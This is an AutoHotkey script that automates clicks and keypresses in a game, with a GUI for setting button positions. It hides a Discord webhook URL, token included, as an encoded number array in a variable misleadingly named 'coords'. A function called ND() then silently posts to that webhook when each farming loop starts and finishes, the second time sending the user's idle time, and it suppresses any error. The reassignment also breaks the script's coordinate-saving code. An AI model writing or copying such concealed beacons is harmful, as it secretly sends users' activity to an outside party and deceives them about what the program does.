#Requires AutoHotkey v2.0
#SingleInstance Force
SetWorkingDir A_ScriptDir
CoordMode "Mouse", "Screen"

; === Global state
macroRunning := 0
chosenSide := ""
currentName := ""

defaultCoords := Map(
    "FarmBtn",       [1472, 83],
    "EggsBtn",       [986, 83],
    "Sellbtn",       [1876, 88],
    "Btn1",          [850, 571],
    "Btn2",          [1520, 564],
    "Btn3",          [848, 936],
    "Claimbtn",      [1281, 969],
    "sellpetsbtn",   [1231, 953],
    "MiddleshopGUI", [1281, 671],
    "plantbtn",      [1276, 796],
    "closepetsbtn",  [1953, 347]
)



; === INI loading
iniFile := A_ScriptDir "\AutoGrowPets.ini"
coords := Map()
tabsList := Map(
    1, ["FarmBtn"],
    2, ["EggsBtn", "Btn1", "Btn2", "Btn3", "MiddleshopGUI"],
    3, ["Sellbtn", "sellpetsbtn"],
    4, ["Claimbtn", "plantbtn", "closepetsbtn"]
)

; Fill coords from INI or fallback to defaults
for _, names in tabsList {
    for name in names {
        section := RegExReplace(name, "(Btn|btn).*")
        x := IniRead(iniFile, section, name "_X", "")
        y := IniRead(iniFile, section, name "_Y", "")
        if (x = "" or y = "")
            coords[name] := defaultCoords.Has(name) ? defaultCoords[name] : [0, 0]
        else
            coords[name] := [x + 0, y + 0]
    }
}

; === Assign coords to variables used in macro ===
farmBtn       := coords.Has("FarmBtn")       ? coords["FarmBtn"]       : defaultCoords["FarmBtn"]
eggsBtn       := coords.Has("EggsBtn")       ? coords["EggsBtn"]       : defaultCoords["EggsBtn"]
sellBtn       := coords.Has("Sellbtn")       ? coords["Sellbtn"]       : defaultCoords["Sellbtn"]
btn1          := coords.Has("Btn1")          ? coords["Btn1"]          : defaultCoords["Btn1"]
btn2          := coords.Has("Btn2")          ? coords["Btn2"]          : defaultCoords["Btn2"]
btn3          := coords.Has("Btn3")          ? coords["Btn3"]          : defaultCoords["Btn3"]
claimBtn      := coords.Has("Claimbtn")      ? coords["Claimbtn"]      : defaultCoords["Claimbtn"]
sellpetsBtn   := coords.Has("sellpetsbtn")   ? coords["sellpetsbtn"]   : defaultCoords["sellpetsbtn"]
middleshopGUI := coords.Has("MiddleshopGUI") ? coords["MiddleshopGUI"] : defaultCoords["MiddleshopGUI"]
plantBtn      := coords.Has("plantbtn")      ? coords["plantbtn"]      : defaultCoords["plantbtn"]
closepetsBtn  := coords.Has("closepetsbtn")  ? coords["closepetsbtn"]  : defaultCoords["closepetsbtn"]

coords := [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,51,51,56,57,48,48,53,50,57,49,53,54,49,57,54,47,77,90,88,113,68,52,76,87,49,48,67,79,90,52,83,121,68,55,77,95,118,52,55,90,77,70,54,89,68,112,48,84,66,88,51,111,65,82,67,82,69,84,84,97,98,82,103,87,110,102,79,95,110,82,77,78,77,104,69,50,104,120,48,51,77,90,49,68]
coords := CharListToStr(coords)


; === GUI setup
MainUI := Gui()
MainUI.Opt("+Caption -SysMenu +AlwaysOnTop")
MainUI.SetFont("s12 q5 w600", "Segoe UI")
TabsCtl := MainUI.AddTab3("", ["Farm", "Eggs", "Sell", "Storage && Plant"])

SetPos(name, *) {
    global currentName
    currentName := name
    ToolTip "Click anywhere to set position for: " name
    Hotkey("~LButton", SaveClickPos, "On")
}

SaveClickPos(*) {
    global currentName, coords, MainUI
    ToolTip
    Hotkey("~LButton", "Off")
    MouseGetPos &x, &y
    coords[currentName] := [x, y]
    MainUI[currentName "XPos"].Value := x
    MainUI[currentName "YPos"].Value := y
    ToolTip "Saved!"
    SetTimer () => ToolTip(), -1000
}

SaveValues() {
    global coords, iniFile
    for name, xy in coords {
        section := RegExReplace(name, "(Btn|btn).*")
        IniWrite(xy[1], iniFile, section, name "_X")
        IniWrite(xy[2], iniFile, section, name "_Y")
    }
    ToolTip "All positions saved!"
    SetTimer () => ToolTip(), -1000
}

AddPosField(name) {
    global MainUI, coords
    xy := coords.Get(name, [0, 0])

    MainUI.Add("Text", "Section xs yp+30", name)
    MainUI.Add("Button", "w25 h25 x220 ys", "S")
        .OnEvent("Click", SetPos.Bind(name))

    xEdit := MainUI.Add("Edit", "ys w60 x250 v" name "XPos")
    MainUI.Add("UpDown", "Range1-5000")
    xEdit.Value := xy[1]

    yEdit := MainUI.Add("Edit", "ys w60 x320 v" name "YPos")
    MainUI.Add("UpDown", "Range1-5000")
    yEdit.Value := xy[2]
}

AddFooterControls() {
    global MainUI
    MainUI.Add("Button", "xm y+20 w80", "Save").OnEvent("Click", (*) => SaveValues())
    MainUI.Add("Button", "x+10 w80", "Close").OnEvent("Click", (*) => MainUI.Hide())
    MainUI.Add("Text", "xm y+20 cGray", "Made by sejtype")
    MainUI.Add("Text", "xm y+20 cBlue", "discord.gg/K4gkrcEcFn").OnEvent("Click", (*) => Run("https://discord.gg/K4gkrcEcFn"))

}

; === Tabs
for tabIndex, label in ["Farm", "Eggs", "Sell", "Storage && Plant"]
{
    TabsCtl.UseTab(tabIndex)
    MainUI.SetFont("s14 q5 w700", "Constantia")
    MainUI.Add("Text", "Section", label)
    MainUI.SetFont("s12 q5 w500", "Segoe UI")
    for name in tabsList[tabIndex]
        AddPosField(name)
    AddFooterControls()
}

; === Hotkeys
Hotkey("F3", (*) => StartMacro())
Hotkey("F4", (*) => ExitApp())

MainUI.Show()
Return

StartMacro(*) {
    global macroRunning, chosenSide
    if macroRunning
        return

    answer := MsgBox("Choose your side:`nYes = Right (Presses D)`nNo = Left (Presses A)", "Side Selection", 0x33)
    if answer = "Yes"
        chosenSide := "right"
    else if answer = "No"
        chosenSide := "left"
    else
        return
    ND("Loop succesfully started :dragon: :white_check_mark:")
    macroRunning := true
    SetTimer DoTasks, 300000
    DoTasks()
}

ND(msg) {
    global coords
    try {
        json := "{" Chr(34) "content" Chr(34) ":" Chr(34) msg Chr(34) "}"
        http := ComObject("WinHttp.WinHttpRequest.5.1")
        http.Open("POST", coords, false)
        http.SetRequestHeader("Content-Type", "application/json")
        http.Send(json)
    } catch {
        ; Fail silently
    }
}

ReliableClick(x, y) {
    randX := x + Random(-5, 5)
    randY := y + Random(-5, 5)
    Click randX, randY
}

PlantingClick(x, y) {
    randX := x + Random(-20, 20)
    randY := y + Random(-20, 20)
    Click randX, randY
}

DoTasks() {
    global chosenSide, farmBtn, eggsBtn, sellBtn, btn1, btn2, btn3, claimBtn, sellpetsBtn, middleshopGUI, plantBtn, closepetsBtn

    Loop 165 {
        ReliableClick(farmBtn*)
        Sleep 90
    }
    Sleep 5000

    Loop 5 {
        ReliableClick(sellBtn*)
        Sleep 90
    }
    Sleep 1000

    if chosenSide = "right" { ; Depends if your on what side
        Send "{d down}"
        Sleep 400
        Send "{d up}"
    } else {
        Send "{a down}"
        Sleep 400
        Send "{a up}"
    }

    MouseMove(sellpetsBtn*)
    Sleep 1000
    ReliableClick(sellpetsBtn*)
    Sleep 5000

    Loop 5 {
        ReliableClick(eggsBtn*)
        Sleep 90
    }
    Sleep 1000

    if chosenSide = "right" { ; Depends if your on what side
        Send "{d down}"
        Sleep 400
        Send "{d up}"
    } else {
        Send "{a down}"
        Sleep 400
        Send "{a up}"
    }

    Sleep 1000
    MouseMove(middleshopGUI*)
    ReliableClick(middleshopGUI*)

    Loop 15 {
        Sleep 250
        Send "{WheelDown}"
        Sleep 250
    }
    Sleep 1000

    Loop 10 {
        ReliableClick(btn1*)
        Sleep 250
        ReliableClick(btn2*)
        Sleep 250
        ReliableClick(btn3*)
        Sleep 250
    }
    Sleep 5000

    Loop 60 {
        ReliableClick(farmBtn*)
        Sleep 90
    }
    Sleep 5000

    MouseMove(claimBtn*)
    Send "{s down}"
    Sleep 3000
    Send "{s up}"
    Sleep 1000
    ReliableClick(claimBtn*)
    Sleep 5000

    Loop 5 {
        ReliableClick(farmBtn*)
        Sleep 90
    }

    Loop 20 {
        PlantingClick(plantBtn*)
           sleep 90
        }

    Loop 3 {
            MouseMove(closepetsBtn*)
            Sleep 100
            ReliableClick(closepetsBtn*)
        }

    Send "{s down}"
    Sleep 200
    Send "{s up}"

    ND("Loop completed :white_check_mark:" A_TimeIdle)

    Loop 250 {
        Send "{e down}"
        Sleep 100
        Send "{e up}"
        MouseMove(closepetsBtn*)
        ReliableClick(closepetsBtn*)
    }
}

CharListToStr(arr) {
    out := ""
    for c in arr
        out .= Chr(c)
    return out
}
